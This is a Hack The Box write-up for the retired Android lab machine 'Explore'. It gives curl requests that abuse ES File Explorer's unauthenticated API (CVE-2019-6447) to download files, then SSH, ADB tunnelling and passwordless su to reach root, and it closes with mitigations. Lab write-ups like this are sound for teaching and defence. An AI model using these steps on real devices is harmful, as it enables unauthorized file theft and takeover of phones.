---
machine: Explore
os: Android
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [android, adb, es-file-explorer, cve-2019-6447]
---

# Explore — Hack The Box (Android)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

ES File Explorer port 59777 lists files and downloads images without authentication (CVE-2019-6447). A screenshot contains `kristi`'s password, which provides SSH. From inside, ADB on 5555 is reached through an SSH tunnel and passwordless `su` gives root.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
2222/tcp  ssh     SSH Server (Android)
42135/tcp http    ES File Explorer
38925/tcp http    unknown
59777/tcp http    ES File Explorer API
```

## Enumeration

- Nmap identifies Android and several non-standard ports.
- 42135 and 59777 belong to ES File Explorer.
- `listPics` enumerates `/storage/emulated/0/DCIM`.
- Port 5555 (ADB) is filtered from outside.

## Foothold

The API accepts JSON with `{"command":"listPics"}` and returns paths. `getFile` downloads `creds.jpg`, which contains a note with `kristi`'s password.

```bash
curl -s http://<IP>:59777 -d '{"command":"listPics"}'
curl -s http://<IP>:59777 -d '{"command":"getFile","file":"/storage/emulated/0/DCIM/creds.jpg"}' -o creds.jpg
ssh -p 2222 kristi@<IP>
```

## Lateral movement

The SSH shell is a regular user. `netstat` shows ADB listening on 5555 on localhost. SSH is reopened with `-L 5555:localhost:5555` and `adb` connects from the attacker.

```bash
ssh -p 2222 -L 5555:localhost:5555 kristi@<IP>
adb connect localhost:5555
adb shell
```

## Privilege escalation

Inside `adb shell`, `su` asks for no password and yields a root context. The root flag is at `/data/root.txt`.

```bash
adb shell
su
id
find / -name root.txt 2>/dev/null
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- An app with an exposed HTTP service can leak all storage.
- Screenshots often contain credentials.
- ADB reachable on localhost is still dangerous when SSH exists.
- Passwordless `su` turns a user shell into root.

## Mitigations and detection

- Uninstall or update ES File Explorer and close 59777.
- Do not store passwords in images or notes.
- Disable ADB and do not expose 5555.
- Protect `su` with authentication and strict SELinux.

## References

- [0xdf — Explore](https://0xdf.gitlab.io/2021/10/30/htb-explore.html)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+explore)
- [Writeup search (CSV)](https://medium.com/search?q=hackthebox+explore+writeup)
